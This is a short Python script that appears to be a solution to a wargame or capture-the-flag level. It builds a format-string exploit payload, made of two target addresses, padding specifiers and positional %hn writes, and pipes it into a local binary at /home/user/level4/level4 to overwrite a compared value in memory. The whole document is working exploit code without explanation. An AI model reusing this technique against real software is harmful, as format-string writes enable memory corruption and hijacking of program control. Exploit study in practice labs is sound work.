#!/usr/bin/python

import os

cmpAddr = "\x08\x04\x98\x10"[::-1]
cmpAddr2 = "\x08\x04\x98\x12"[::-1]
cmpValue = "\x01\x02\x55\x44"
payload = cmpAddr + cmpAddr2 + "%250d" + "%13\$hn" + "%21570d" + "%12\$hn"

cmd = "echo \"" + payload + "\" | /home/user/level4/level4"
os.system(cmd)
